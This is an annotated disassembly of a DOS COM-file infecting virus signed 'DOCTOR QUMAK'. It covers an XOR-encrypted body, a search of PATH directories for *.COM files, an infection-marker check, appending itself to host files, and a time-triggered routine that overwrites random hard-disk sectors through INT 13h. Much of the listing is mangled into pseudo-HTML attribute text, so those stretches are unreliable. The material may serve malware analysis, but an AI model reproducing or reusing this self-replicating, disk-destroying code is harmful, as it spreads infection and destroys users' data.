

seg_a	segment	byte public
	assume	cs:seg_a, ds:seg_a

	org	100h

start:	jmp	l_02F3						;0100  E9 01F0
	db	6Bh,73h,0CAh,0Eh	;contamination ptr	;0103  6B 73 CA 0E


	org	2F3h
;----------------------------------------------
l_02F3:	push	cx						;02F3  51
	mov	dx,offset d_0683	;coded virus part addr	;02F4  BA 0683
	nop							;02F7  90

	;<--------- encoding="" push="" dx="" ;02f8="" 52="" pop="" bx="" ;02f9="" 5b="" mov="" cx,0f9h="" ;coded="" block="" length="" ;02fa="" b9="" 00f9="" mov="" si,dx="" ;02fd="" 8b="" f2="" dec="" si="" ;02ff="" 4e="" mov="" dl,[si]="" ;0300="" 8a="" 14="" inc="" si="" ;0302="" 46="" l_0303:="" mov="" al,[bx]="" ;encoding="" loop="" ;0303="" 8a="" 07="" xor="" al,dl="" ;0305="" 32="" c2="" nop="" ;0307="" 90="" mov="" [bx],al="" ;0308="" 88="" 07="" inc="" bx="" ;030a="" 43="" loop="" l_0303="" ;030b="" e2="" f6="" mov="" dx,si="" ;030d="" 8b="" d6=""></---------><----- restore="" changed="" bytes="" xor="" ax,ax="" ;030f="" 33="" c0="" xor="" bx,bx="" ;0311="" 33="" db="" cld="" ;0313="" fc="" mov="" si,dx="" ;0314="" 8b="" f2="" add="" si,0adh="" ;x_00ad="" ;saved="" bytes="" address="" ;0316="" .81="" c6="" 00ad="" mov="" di,100h="" ;target="" address="" ;031a="" .bf="" 0100="" mov="" cx,7="" ;changed="" bytes="" ;031d="" b9="" 0007="" nop="" ;0320="" 90="" rep="" movsb="" ;0321="" f3/="" a4="" mov="" si,dx="" ;0323="" 8b="" f2="" mov="" byte="" ptr="" ds:[si+0f8h],0="" ;x_00f8="" ;0325="" c6="" 84="" 00f8="" 00="" mov="" ah,30h="" ;get="" dos="" version="" nr="" ;032a="" b4="" 30="" int="" 21h="" ;032c="" cd="" 21="" cmp="" al,0="" ;major="" version="" ;032e="" 3c="" 00="" nop="" ;0330="" 90="" jnz="" l_0335="" ;0331="" 75="" 02="" nop="" ;0333="" 90="" nop="" ;0334="" 90="" l_0335:="" mov="" bp,0bfh="" ;x_00bf="" ;0335="" bd="" 00bf="" add="" bp,si="" ;0338="" 03="" ee="" mov="" byte="" ptr="" ds:[bp],0="" ;033a="" 3e:="" c6="" 46="" 00="" 00="" push="" es="" ;033f="" 06="" nop="" ;0340="" 90="" mov="" ah,2fh="" ;get="" dta="" ptr="" into="" es:bx="" ;0341="" b4="" 2f="" int="" 21h="" ;0343="" cd="" 21="" mov="" [si],bx="" ;x_0000="" ;0345="" 89="" 1c="" mov="" [si+2],es="" ;x_0002="" ;0347="" 8c="" 44="" 02="" pop="" es="" ;034a="" 07="" mov="" dx,5fh="" ;x_005f="" ;034b="" .ba="" 005f="" add="" dx,si="" ;034e="" 03="" d6="" mov="" ah,1ah="" ;set="" dta="" to="" ds:dx="" ;0350="" b4="" 1a="" int="" 21h="" ;0352="" cd="" 21="" push="" es="" ;0354="" 06="" push="" si="" ;0355="" 56="" mov="" es,ds:[2ch]="" ;environment="" segment="" ;0356="" 8e="" 06="" 002c="" mov="" di,0="" ;035a="" .bf="" 0000="" l_035d:="" pop="" si="" ;035d="" 5e="" push="" si="" ;035e="" 56="" add="" si,1ah="" ;x_001a="" ('path=')	;035F  83 C6 1A
	lodsb							;0362  AC
	mov	cx,8000h					;0363  B9 8000
	repne	scasb						;0366  F2/ AE
	mov	cx,4						;0368  B9 0004
l_036B:	lodsb							;036B  AC
	scasb							;036C  AE
	jnz	l_035D						;036D  75 EE
	loop	l_036B						;036F  E2 FA

	;<----- Environment variable ' path='
	pop	si						;0371  5E
	pop	es						;0372  07
	mov	[si+16h],di		;x_0016			;0373  89 7C 16
	mov	di,si						;0376  8B FE
	add	di,1Fh			;x_001F = work buffer	;0378  83 C7 1F
	mov	bx,si						;037B  8B DE
	add	si,1Fh			;x_001F = work buffer	;037D  83 C6 1F
	mov	di,si						;0380  8B FE
	jmp	short l_03CE					;0382  EB 4A

	;<----- next directory
l_0384:	cmp	word ptr [si+16h],0	;x_0016 = ptr in env	;0384  83 7C 16 00
	jne	l_0392			;-> not all in ' path'="" ;0388="" 75="" 08="" mov="" byte="" ptr="" ds:[si+0f8h],1=""></-----><- end="" of="" 'path'="" ;038a="" c6="" 84="" 00f8="" 01="" jmp="" l_04e9="" ;038f="" e9="" 0157="" l_0392:="" push="" ds="" ;0392="" 1e="" push="" si="" ;0393="" 56="" mov="" bp,0bfh="" ;x_00bf="" ;0394="" .bd="" 00bf="" add="" bp,si="" ;0397="" 03="" ee="" mov="" ds,es:[02ch]="" ;environment="" segment="" ;0399="" 26:="" 8e="" 1e="" 002c="" mov="" di,si="" ;039e="" 8b="" fe="" mov="" si,es:[di+16h]="" ;ptr="" in="" environment="" ;03a0="" 26:="" 8b="" 75="" 16="" add="" di,1fh="" ;pattern="" address="" ;03a4="" 83="" c7="" 1f="" l_03a7:="" lodsb="" ;03a7="" ac="" cmp="" al,';'="" ;directory="" delimiter="" ;03a8="" 3c="" 3b="" je="" l_03bb="" ;03aa="" 74="" 0f="" cmp="" al,0="" ;03ac="" 3c="" 00="" je="" l_03b8="" ;position="" delimiter="" ;03ae="" 74="" 08="" mov="" es:[bp],al="" ;03b0="" 26:="" 88="" 46="" 00="" inc="" bp="" ;03b4="" 45="" stosb="" ;03b5="" aa="" jmp="" short="" l_03a7="" ;03b6="" eb="" ef="" l_03b8:="" mov="" si,0="" ;end="" of="" path="" ptr="" ;03b8="" .be="" 0000="" l_03bb:="" pop="" bx="" ;03bb="" 5b="" pop="" ds="" ;03bc="" 1f="" mov="" [bx+16h],si="" ;save="" current="" ptr="" ;03bd="" 89="" 77="" 16="" cmp="" byte="" ptr="" [di-1],'\'="" ;last="" path="" char="" ;03c0="" 80="" 7d="" ff="" 5c="" je="" l_03ce="" ;-=""> o.k.		;03C4  74 08
	mov	al,'\'			;<- add="" dir="" delimiter="" ;03c6="" b0="" 5c="" mov="" es:[bp],al="" ;03c8="" 26:="" 88="" 46="" 00="" inc="" bp="" ;03cc="" 45="" stosb="" ;03cd="" aa="" l_03ce:="" mov="" byte="" ptr="" es:[bp],0="" ;x_00bf="" ;03ce="" 26:="" c6="" 46="" 00="" 00="" mov="" bp,0="" ;03d3="" bd="" 0000="" mov="" [bx+18h],di="" ;[x_0018]:="x_001F" ;03d6="" 89="" 7f="" 18="" mov="" si,bx="" ;offset="" d_0683="" ;03d9="" 8b="" f3="" add="" si,10h="" ;x_0010="" ('*.com')="" ;03db="" 83="" c6="" 10="" mov="" cx,6="" ;03de="" b9="" 0006="" rep="" movsb="" ;03e1="" f3/="" a4="" mov="" si,bx="" ;03e3="" 8b="" f3="" mov="" ah,4eh="" ;find="" 1st="" filenam="" match="" @ds:dx="" ;03e5="" b4="" 4e="" mov="" dx,01fh="" ;x_001f="" (file="" pattern)="" ;03e7="" .ba="" 001f="" add="" dx,si="" ;03ea="" 03="" d6="" mov="" cx,3="" ;attribute="" pattern="" ;03ec="" b9="" 0003="" int="" 21h="" ;03ef="" cd="" 21="" jmp="" short="" l_0429="" ;03f1="" eb="" 36=""></-><----- next="" file="" in="" the="" same="" directory="" l_03f3:="" mov="" bp,0bfh="" ;file="" name="" address="" ;03f3="" .bd="" 00bf="" add="" bp,si="" ;03f6="" 03="" ee="" push="" bp="" ;03f8="" 55="" mov="" ax,0="" ;03f9="" b8="" 0000="" dec="" bp="" ;03fc="" 4d="" l_03fd:="" inc="" bp="" ;03fd="" 45="" cmp="" byte="" ptr="" ds:[bp],'\'="" ;begin="" of="" file="" name="" ;03fe="" 3e:="" 80="" 7e="" 00="" 5c="" jne="" l_0407="" ;0403="" 75="" 02="" mov="" ax,bp="" ;possibly="" here="" ;0405="" 8b="" c5="" l_0407:="" cmp="" byte="" ptr="" ds:[bp],0="" ;end="" of="" filename="" ;0407="" 3e:="" 80="" 7e="" 00="" 00="" jne="" l_03fd="" ;-=""> not now		;040C  75 EF
	cmp	ax,0			;have been any dir ?	;040E  3D 0000
	pop	bp						;0411  5D
	jnz	l_041B			;-> yes			;0412  75 07
	mov	byte ptr ds:[bp],0	;<- we="" are="" in="" the="" root="" ;0414="" 3e:="" c6="" 46="" 00="" 00="" jmp="" short="" l_0425="" ;0419="" eb="" 0a="" l_041b:="" mov="" bp,ax="" ;end="" of="" path="" address="" ;041b="" 8b="" e8="" mov="" byte="" ptr="" ds:[bp+1],0="" ;end="" ptr="" ;041d="" 3e:="" c6="" 46="" 01="" 00="" mov="" bp,0="" ;0422="" bd="" 0000="" l_0425:="" mov="" ah,4fh="" ;find="" next="" file="" match="" ;0425="" b4="" 4f="" int="" 21h="" ;0427="" cd="" 21="" l_0429:="" jnc="" l_042e="" ;0429="" 73="" 03="" jmp="" l_0384="" ;-=""> end of files in current dir	;042B  E9 FF56

l_042E:	mov	bp,0BFh		;x_00BF = victim name		;042E .BD 00BF
	add	bp,si						;0431  03 EE
	dec	bp						;0433  4D
l_0434:	inc	bp						;0434  45
	cmp	byte ptr ds:[bp],0	;find end of path	;0435  3E: 80 7E 00 00
	jne	l_0434						;043A  75 F8
	mov	di,bp						;043C  8B FD
	mov	bp,0						;043E  BD 0000
	push	si						;0441  56
	add	si,7Dh			;x_007D - DTA-file name	;0442  83 C6 7D
l_0445:	lodsb				;add file name		;0445  AC
	stosb							;0446  AA
	cmp	al,0						;0447  3C 00
	jne	l_0445						;0449  75 FA
	pop	si						;044B  5E
	mov	dx,si						;044C  8B D6
	add	dx,0BFh			;x_00BF = file name	;044E .81 C2 00BF
	mov	ax,3D00h		;open file R/O		;0452  B8 3D00
	int	21h						;0455  CD 21
	jnc	l_045C						;0457  73 03
	jmp	l_0384			;-> error, next dir	;0459  E9 FF28

l_045C:	mov	bx,ax			;file handle		;045C  8B D8
	mov	dx,0B8h			;x_00B8	= file buffer	;045E .BA 00B8
	add	dx,si						;0461  03 D6
	mov	cx,7			;bytes to read		;0463  B9 0007
	mov	ah,3Fh			;read handle		;0466  B4 3F
	int	21h						;0468  CD 21
	mov	ah,3Eh			;close handle		;046A  B4 3E
	int	21h						;046C  CD 21
	mov	di,0BBh			;4,5,6,7 bytes from file;046E .BF 00BB
	add	di,si						;0471  03 FE
	mov	bx,0B4h			;contam. ptr pattern	;0473 .BB 00B4
	add	bx,si						;0476  03 DE
	mov	ax,[di]						;0478  8B 05
	cmp	ax,[bx]						;047A  3B 07
	jne	l_0489			;-> not infected yet	;047C  75 0B
	mov	ax,[di+2]					;047E  8B 45 02
	cmp	ax,[bx+2]					;0481  3B 47 02
	jne	l_0489			;-> not infected yet	;0484  75 03
l_0486:	jmp	l_03F3			;-> allready infected	;0486  E9 FF6A

l_0489:	cmp	word ptr [si+79h],0FA00h ;file size		;0489  81 7C 79 FA00
	nop							;048E  90
	ja	l_0486			;-> to big		;048F  77 F5
	cmp	word ptr [si+79h],0Ah	;file size		;0491  83 7C 79 0A
	jb	l_0486			;-> to small		;0495  72 EF
	mov	di,[si+18h]		;678Bh ??		;0497  8B 7C 18
	push	si						;049A  56
	add	si,7Dh			;DTA - file name	;049B  83 C6 7D
l_049E:	lodsb							;049E  AC
	stosb							;049F  AA
	cmp	al,0						;04A0  3C 00
	jne	l_049E						;04A2  75 FA
	pop	si						;04A4  5E
	mov	ax,4300h	;get file attrb, nam@ds:dx	;04A5  B8 4300
	mov	dx,01Fh		;file name			;04A8 .BA 001F
	push	si						;04AB  56
	pop	si						;04AC  5E
	add	dx,si						;04AD  03 D6
	int	21h						;04AF  CD 21
	mov	[si+8],cx	;save oryginal attributes	;04B1  89 4C 08
	mov	ax,4301h	;set file attrb, nam@ds:dx	;04B4  B8 4301
	and	cl,0FEh		;clear R/O			;04B7  80 E1 FE
	mov	dx,01Fh						;04BA .BA 001F
	add	dx,si						;04BD  03 D6
	int	21h						;04BF  CD 21

	mov	ax,3D02h	;open file R/W			;04C1  B8 3D02
	mov	dx,01Fh		;file name address		;04C4 .BA 001F
	add	dx,si						;04C7  03 D6
	int	21h						;04C9  CD 21
	jnc	l_04D0		;-> O.K.			;04CB  73 03
	jmp	l_0638		;-> error			;04CD  E9 0168
l_04D0:	mov	bx,ax		;file handle			;04D0  8B D8
	mov	ax,5700h	;get file date & time		;04D2  B8 5700
	int	21h		; DOS Services  ah=function 57h	;04D5  CD 21
	mov	[si+4],cx					;04D7  89 4C 04
	mov	[si+6],dx					;04DA  89 54 06
	mov	ah,2Ch		;get time			;04DD  B4 2C
	int	21h						;04DF  CD 21
	and	dh,7		;seconds			;04E1  80 E6 07
	jz	l_04E9						;04E4  74 03
	jmp	l_0572		;-> contamine			;04E6  E9 0089

				;<- end="" of="" 'path'="" members="" l_04e9:="" push="" bx="" ;04e9="" 53="" push="" si="" ;04ea="" 56="" mov="" ah,8="" ;read="" parameters="" for="" drive="" dl="" ;04eb="" b4="" 08="" mov="" dl,80h="" ;hdd="" 0="" ;04ed="" b2="" 80="" int="" 13h="" ;04ef="" cd="" 13="" cmp="" dl,0="" ;nr="" of="" fixed="" disks="" ;04f1="" 80="" fa="" 00="" je="" l_0562="" ;-=""> no HDD			;04F4  74 6C
	mov	al,cl					;04F6  8A C1
	and	al,3Fh			; '?'		;04F8  24 3F
	mov	ds:[si+0F4h],al				;04FA  88 84 00F4
	mov	al,ch					;04FE  8A C5
	mov	ah,cl					;0500  8A E1
	and	ah,0C0h					;0502  80 E4 C0
	mov	cl,6					;0505  B1 06
	shr	ah,cl					;0507  D2 EC
	mov	ds:[si+0F1h],ax				;0509  89 84 00F1
	mov	ds:[si+0F3h],dh				;050D  88 B4 00F3
l_0511:	mov	ah,2Ch			; ','		;0511  B4 2C
	int	21h		; DOS Services  ah=function 2Ch	;0513  CD 21
				;  get time, cx=hrs/min, dh=sec
	shr	dl,1					;0515  D0 EA
	shr	dl,1					;0517  D0 EA
	and	dl,7					;0519  80 E2 07
	cmp	dl,ds:[si+0F3h]				;051C  3A 94 00F3
	ja	l_0511					;0520  77 EF
	mov	ds:[si+0F7h],dl				;0522  88 94 00F7
	push	ds					;0526  1E
	mov	ax,0					;0527  B8 0000
	mov	ds,ax					;052A  8E D8
	mov	bx,046Ch				;052C .BB 046C
	mov	ax,[bx]					;052F  8B 07
	mov	dx,[bx+2]				;0531  8B 57 02
	pop	ds					;0534  1F
	div	word ptr ds:[si+0F1h]			;0535  F7 B4 00F1
l_0539:	cmp	dx,ds:[si+0F1h]				;0539  3B 94 00F1
	jbe	l_0543					;053D  76 04
	shr	dx,1					;053F  D1 EA
	jmp	short l_0539				;0541  EB F6
l_0543:	mov	ds:[si+0F5h],dx				;0543  89 94 00F5
	mov	ax,dx					;0547  8B C2
	mov	dl,80h					;0549  B2 80
	mov	dh,ds:[si+0F7h]				;054B  8A B4 00F7
	mov	ch,al					;054F  8A E8
	mov	cl,6					;0551  B1 06
	shl	ah,cl					;0553  D2 E4
	mov	cl,ah					;0555  8A CC
	mov	ah,3					;0557  B4 03
	or	cl,1					;0559  80 C9 01
	mov	al,ds:[si+0F4h]				;055C  8A 84 00F4
	int	13h		; Disk  dl=drive 0  ah=func 03h	;0560  CD 13
				;  write sectors from mem es:bx

	;<----- l_0562:="" pop="" si="" ;0562="" 5e="" pop="" bx="" ;0563="" 5b="" cmp="" byte="" ptr="" ds:[si+0f8h],0="" ;x_00f8="" ;0564="" 80="" bc="" 00f8="" 00="" je="" l_056e="" ;-=""> O.K.			;0569  74 03
	jmp	l_0647		;-> no 'PATH'			;056B  E9 00D9

l_056E:	jmp	l_0628						;056E  E9 00B7
	nop							;0571  90

	;<----- contamine="" file="" l_0572:="" mov="" ah,3fh="" ;="" '?'="" ;0572="" b4="" 3f="" mov="" cx,7="" ;0574="" b9="" 0007="" mov="" dx,0adh="" ;0577="" .ba="" 00ad="" add="" dx,si="" ;057a="" 03="" d6="" int="" 21h="" ;="" dos="" services="" ah="function" 3fh="" ;057c="" cd="" 21="" ;="" read="" file,="" cx="bytes," to="" ds:dx="" jnc="" l_0583="" ;057e="" 73="" 03="" jmp="" l_0628="" ;0580="" e9="" 00a5="" l_0583:="" cmp="" ax,7="" ;0583="" 3d="" 0007="" je="" l_058b="" ;0586="" 74="" 03="" jmp="" l_0628="" ;0588="" e9="" 009d="" l_058b:="" mov="" ax,4202h="" ;058b="" b8="" 4202="" mov="" cx,0="" ;058e="" b9="" 0000="" mov="" dx,0="" ;0591="" ba="" 0000="" int="" 21h="" ;="" dos="" services="" ah="function" 42h="" ;0594="" cd="" 21="" ;="" move="" file="" ptr,="" cx,dx="offset" jnc="" l_059b="" ;0596="" 73="" 03="" jmp="" l_0628="" ;0598="" e9="" 008d="" l_059b:="" mov="" cx,ax="" ;059b="" 8b="" c8="" sub="" ax,3="" ;059d="" 2d="" 0003="" mov="" [si+0eh],ax="" ;05a0="" 89="" 44="" 0e="" add="" cx,490h="" ;05a3="" 81="" c1="" 0490="" mov="" di,si="" ;05a7="" 8b="" fe="" sub="" di,38eh="" ;05a9="" 81="" ef="" 038e="" mov="" [di],cx="" ;05ad="" 89="" 0d="" mov="" ah,40h="" ;="" '@'="" ;05af="" b4="" 40="" mov="" cx,489h="" ;05b1="" b9="" 0489="" mov="" dx,si="" ;05b4="" 8b="" d6="" sub="" dx,390h="" ;05b6="" 81="" ea="" 0390="" push="" dx="" ;05ba="" 52="" push="" cx="" ;05bb="" 51="" push="" bx="" ;05bc="" 53="" push="" ax="" ;05bd="" 50="" mov="" ah,2ch="" ;="" ','="" ;05be="" b4="" 2c="" int="" 21h="" ;="" dos="" services="" ah="function" 2ch="" ;05c0="" cd="" 21="" ;="" get="" time,="" cx="hrs/min," dh="sec" mov="" dl,cl="" ;05c2="" 8a="" d1="" add="" dl,dh="" ;05c4="" 02="" d6="" add="" dl,82h="" ;05c6="" 80="" c2="" 82="" mov="" [si-1],dl="" ;05c9="" 88="" 54="" ff="" mov="" bx,si="" ;05cc="" 8b="" de="" mov="" cx,0f9h="" ;05ce="" b9="" 00f9="" l_05d1:="" mov="" al,[bx]="" ;05d1="" 8a="" 07="" xor="" al,dl="" ;05d3="" 32="" c2="" mov="" [bx],al="" ;05d5="" 88="" 07="" inc="" bx="" ;05d7="" 43="" loop="" l_05d1="" ;05d8="" e2="" f7="" pop="" ax="" ;05da="" 58="" pop="" bx="" ;05db="" 5b="" pop="" cx="" ;05dc="" 59="" pop="" dx="" ;05dd="" 5a="" int="" 21h="" ;="" dos="" services="" ah="function" 40h="" ;05de="" cd="" 21="" ;="" write="" file="" cx="bytes," to="" ds:dx="" push="" dx="" ;05e0="" 52="" push="" cx="" ;05e1="" 51="" push="" bx="" ;05e2="" 53="" push="" ax="" ;05e3="" 50="" mov="" bx,si="" ;05e4="" 8b="" de="" mov="" cx,0f9h="" ;05e6="" b9="" 00f9="" mov="" dl,[si-1]="" ;05e9="" 8a="" 54="" ff="" l_05ec:="" mov="" al,[bx]="" ;05ec="" 8a="" 07="" xor="" al,dl="" ;05ee="" 32="" c2="" nop="" ;05f0="" 90="" mov="" [bx],al="" ;05f1="" 88="" 07="" inc="" bx="" ;05f3="" 43="" loop="" l_05ec="" ;05f4="" e2="" f6="" pop="" ax="" ;05f6="" 58="" pop="" bx="" ;05f7="" 5b="" pop="" cx="" ;05f8="" 59="" pop="" dx="" ;05f9="" 5a="" jc="" l_0628="" ;05fa="" 72="" 2c="" cmp="" ax,489h="" ;05fc="" 3d="" 0489="" jne="" l_0628="" ;05ff="" 75="" 27="" mov="" ax,4200h="" ;0601="" b8="" 4200="" nop="" ;0604="" 90="" mov="" cx,0="" ;0605="" b9="" 0000="" mov="" dx,0="" ;0608="" ba="" 0000="" int="" 21h="" ;="" dos="" services="" ah="function" 42h="" ;060b="" cd="" 21="" ;="" move="" file="" ptr,="" cx,dx="offset" jc="" l_0628="" ;060d="" 72="" 19="" mov="" ah,40h="" ;="" '@'="" ;060f="" b4="" 40="" mov="" cx,3="" ;0611="" b9="" 0003="" mov="" dx,si="" ;0614="" 8b="" d6="" add="" dx,0dh="" ;0616="" 83="" c2="" 0d="" int="" 21h="" ;="" dos="" services="" ah="function" 40h="" ;0619="" cd="" 21="" ;="" write="" file="" cx="bytes," to="" ds:dx="" mov="" cx,4="" ;061b="" b9="" 0004="" mov="" dx,si="" ;061e="" 8b="" d6="" add="" dx,0b4h="" ;0620="" .81="" c2="" 00b4="" mov="" ah,40h="" ;="" '@'="" ;0624="" b4="" 40="" int="" 21h="" ;="" dos="" services="" ah="function" 40h="" ;0626="" cd="" 21="" ;="" write="" file="" cx="bytes," to="" ds:dx="" l_0628:="" mov="" dx,[si+6]="" ;0628="" 8b="" 54="" 06="" nop="" ;062b="" 90="" mov="" cx,[si+4]="" ;062c="" 8b="" 4c="" 04="" mov="" ax,5701h="" ;062f="" b8="" 5701="" int="" 21h="" ;="" dos="" services="" ah="function" 57h="" ;0632="" cd="" 21="" ;="" get/set="" file="" date="" &="" time="" mov="" ah,3eh="" ;="" '="">'		;0634  B4 3E
	int	21h		; DOS Services  ah=function 3Eh	;0636  CD 21
				;  close file, bx=file handle
l_0638:	mov	ax,4301h				;0638  B8 4301
	mov	cx,[si+8]				;063B  8B 4C 08
	mov	dx,01Fh					;063E .BA 001F
	nop						;0641  90
	add	dx,si					;0642  03 D6
	nop						;0644  90
	int	21h		; DOS Services  ah=function 43h	;0645  CD 21
				;  get/set file attrb, nam@ds:dx

	;<----- exit="" l_0647:="" push="" ds="" ;0647="" 1e="" mov="" ah,1ah="" ;set="" dta="" to="" ds:dx="" ;0648="" b4="" 1a="" mov="" dx,[si]="" ;saved="" victim="" dta="" ;064a="" 8b="" 14="" mov="" ds,[si+2]="" ;064c="" 8e="" 5c="" 02="" int="" 21h="" ;064f="" cd="" 21="" pop="" ds="" ;restore="" registers="" ;0651="" 1f="" pop="" cx="" ;0652="" 59="" xor="" ax,ax="" ;0653="" 33="" c0="" xor="" bx,bx="" ;0655="" 33="" db="" xor="" dx,dx="" ;0657="" 33="" d2="" xor="" si,si="" ;0659="" 33="" f6="" nop="" ;065b="" 90="" mov="" di,100h="" ;victim="" entry="" point="" ;065c="" .bf="" 0100="" nop="" ;065f="" 90="" push="" di="" ;0660="" 57="" nop="" ;0661="" 90="" xor="" di,di="" ;0662="" 33="" ff="" retn="" ;-=""> run victim		;0664  C3

	db	1,2,3					;0665  01 02 03
	db	1,2,3					;0668  01 02 03
	db	4,5,6					;066B  04 05 06

	db	0Dh,0Ah					;066E  0D 0A
	db	'(C) DOCTOR QUMAK'			;0670  28 43 29 20 44 4F 43 54
							;0678  4F 52 20 51 55 4D 41 4B
	db	0Dh,0Ah					;0680  0D 0A

	db	0B6h		;klucz kodowania	;0682  B6

d_0683	label	byte

x_0000	dw	0080h		;victim DTA offset		;0000  80 00
x_0002	dw	10ABh		;victim DTA segment		;0003  AB 10
x_0004	dw	9BEFh		;victim time stamp		;0004  EF 9B
x_0006	dw	1587h		;victim date stamp		;0006  87 15
x_0008	dw	0020h		;victim attribute		;0008  20 00

	db	0E9h,0F9h,00h					;000A  E9 F9 00
	db	0E9h,0F0h,01h					;000D  E9 F0 01

x_0010	db	'*.COM',0				;0010  2A 2E 43 4F 4D 00
x_0016	dw	002Ah		;ptr in environment		;0016  2A 00

x_0018	dw	678Bh		;???			;0018  8B 67

x_001A	db	'PATH='					;001A  50 41 54 48 3D
x_001F	db	'CS.COM',0				;001F  43 53 2E 43 4F 4D 00
	db	'.COM', 0				;0026  2E 43 4F 4D 00
	db	'T.COM', 0				;002B  54 2E 43 4F 4D 00
	db	'OM',0					;0031  4F 4D 00
	db	43 dup (' ')				;0034  002B[20]

	;<----- virus="" dta="" x_005f="" db="" 04h="" ;005f="" 04="" db="" '????????com'="" ;0060="" 0008[3f]="" 43="" 4f="" 4d="" db="" 03h,14h,00h,51h,01h,00h,00h,00h,00h="" ;006b="" 03="" 14="" 00="" 51="" 01="" 00="" 00="" 00="" 00="" x_0074="" db="" 20h="" ;attribute="" found="" ;0074="" 20="" x_0075="" dw="" 9befh="" ;time="" stamp="" ;0075="" ef="" 9b="" x_0077="" dw="" 1587h="" ;date="" stamp="" ;0077="" 87="" 15="" x_0079="" dw="" 01f3h,0="" ;file="" size="" ;0079="" f3="" 01="" 00="" 00="" x_007d="" db="" 'cs.com',0,'="" com',0,0="" ;file="" name="" ;007d="" 43="" 53="" 2e="" 43="" 4f="" 4d="" 00="" 20="" 43="" 4f="" 4d="" 00="" 00="" db="" 0eah,0f0h="" ;008a="" ea="" f0="" db="" 0ffh,="" 00h,0f0h="" ;008c="" ff="" 00="" f0="" db="" 'hello="" world="" from="" my="" virus="" !',0dh,0ah,'$'="" ;008f="" 48="" 65="" 6c="" 6c="" 6f="" 20="" ;0095="" 77="" 6f="" 72="" 6c="" 64="" 20="" ;009b="" 66="" 72="" 6f="" 6d="" 20="" 6d="" ;00a1="" 79="" 20="" 76="" 69="" 72="" 75="" ;00a7="" 73="" 20="" 21="" 0d="" 0a="" 24=""></-----><----- saved="" victim="" bytes="" x_00ad="" db="" 0ebh,00h,1eh,0b8h,00h,00h,50h="" ;00ad="" eb="" 00="" 1e="" b8="" 00="" 00="" 50="" ;contamination="" pattern="" x_00b4="" db="" 6bh,73h,0cah,0eh="" ;00b4="" 6b="" 73="" ca="" 0e=""></-----><----- file="" buffer="" x_00b8="" db="" 0ebh,00h,1eh="" ;00b8="" eb="" 00="" 1e="" x_00bb="" db="" 0b8h,00h,00h,50h="" ;contam.ptr.here="" ;00bb="" b8="" 00="" 00="" 50="" x_00bf="" db="" 'cs.com',0="" ;file="" name="" &="" path="" ;00bf="" 43="" 53="" 2e="" 43="" 4f="" 4d="" 00="" db="" '.com',0="" ;00c6="" 2e="" 43="" 4f="" 4d="" 00="" db="" 't.com',="" 0="" ;00cb="" 54="" 2e="" 43="" 4f="" 4d="" 00="" db="" 'm',0="" ;00d1="" 4d="" 00="" db="" '="" the="" stuff="" that="" should="" be="" here'="" ;00d3="" 20="" 74="" 68="" 65="" 20="" 73="" ;00d9="" 74="" 75="" 66="" 66="" 20="" 74="" ;00df="" 68="" 61="" 74="" 20="" 73="" 68="" ;00e5="" 6f="" 75="" 6c="" 64="" 20="" 62="" ;00eb="" 65="" 20="" 68="" 65="" 72="" 65="" x_00f1="" dw="" 0="" ;00f1="" 00="" 00="" x_00f3="" db="" 0="" ;00f3="" 00="" x_00f4="" db="" 0="" ;00f4="" 00="" x_00f5="" dw="" 0="" ;00f5="" 00="" 00="" x_00f7="" db="" 0="" ;00f7="" 00="" x_00f8="" db="" 0="" ;1="no" path="" ;00f8="" 00="" seg_a="" ends="" end="" start="" =""></-----></-----></-----></-----></-></-></-----></->